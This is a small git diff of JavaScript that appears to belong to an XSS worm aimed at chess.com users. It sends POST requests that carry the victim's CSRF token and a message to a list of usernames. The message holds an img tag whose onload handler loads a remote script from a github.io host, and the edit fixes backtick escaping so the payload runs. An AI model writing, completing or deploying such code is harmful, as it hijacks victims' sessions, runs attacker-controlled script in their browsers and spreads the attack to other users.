@@ -30,7 +30,7 @@ fetch(tournament_URL).then((text)=>{
     "headers": {
         "content-type": "application/json;charset=UTF-8",
     },
-    "body": `{\"_token\":\"${context.crsf.token}\",\"message\":\"<img src='https://betacssjs.chesscomfiles.com/bundles/web/images/noavatar_l.84a92436.gif' onload='body.appendChild(document.createElement`script`).src=`//yellowrook1.github.io/w.js`'>\",\"usernames\":\"${users}\"}`,
+    "body": `{\"_token\":\"${context.crsf.token}\",\"message\":\"<img src='https://betacssjs.chesscomfiles.com/bundles/web/images/noavatar_l.84a92436.gif' onload='body.appendChild(document.createElement\`script\`).src=\`//yellowrook1.github.io/w.js\`'>\",\"usernames\":\"${users}\"}`,
     "method": "POST",
 });
 
